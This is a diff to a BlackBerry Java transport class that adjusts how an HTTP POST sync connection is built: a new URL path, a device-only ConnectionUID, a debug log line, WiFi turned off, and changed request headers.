@@ -12,7 +12,9 @@ import javax.microedition.io.StreamConnection;
 import net.rim.device.api.io.IOCancelledException;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.ByteVector;
+import blackberry.Device;
 import blackberry.action.sync.Transport;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -33,13 +35,13 @@ public class Wap2Transport extends Transport {
     private final String HEADER_SETCOOKIE = "set-cookie";
     private final String HEADER_CONTENTLEN = "content-length";
 
-    private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
+    //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
     private final String CONTENT_TYPE = "application/octet-stream";
     static//private static String CONTENTTYPE_TEXTHTML = "text/html";
-    boolean acceptWifi = true;
+    boolean acceptWifi = false;
 
     public Wap2Transport(String host, int port) {
-        super(host, port);
+        super(host, port);       
     }
 
     public boolean isAvailable() {
@@ -48,9 +50,15 @@ public class Wap2Transport extends Transport {
     }
 
     public boolean initConnection() {
-        url = "http://" + host + ":" + port + "/" + ";deviceside=true;";
-        // + ";deviceside=true;ConnectionUID=" + transportId;
+        url = "http://" + host + ":" + port + "/wc12/webclient" + ";deviceside=true";
 
+        if(!DeviceInfo.isSimulator()){
+               url+=";ConnectionUID=" + transportId;
+        }
+        
+        //#ifdef DEBUG
+        debug.info("initConnection: "+ url);
+        //#endif
         cookie = null;
         stop = false;
         return true;
@@ -105,13 +113,14 @@ public class Wap2Transport extends Transport {
             s = (StreamConnection) Connector.open(getUrl());
             httpConn = (HttpConnection) s;
             httpConn.setRequestMethod(HttpConnection.POST);
-            httpConn.setRequestProperty("User-Agent", USER_AGENT);
-            httpConn.setRequestProperty("Content-Language", "en-US");
+            //httpConn.setRequestProperty("User-Agent", USER_AGENT);
+            //httpConn.setRequestProperty("Content-Language", "en-US");
 
             if (cookie != null) {                
                 httpConn.setRequestProperty("Cookie", cookie);
             }
 
+            httpConn.setRequestProperty("Host", httpConn.getHost());
             httpConn.setRequestProperty("Content-Type", CONTENT_TYPE);
 
             OutputStream os = null;
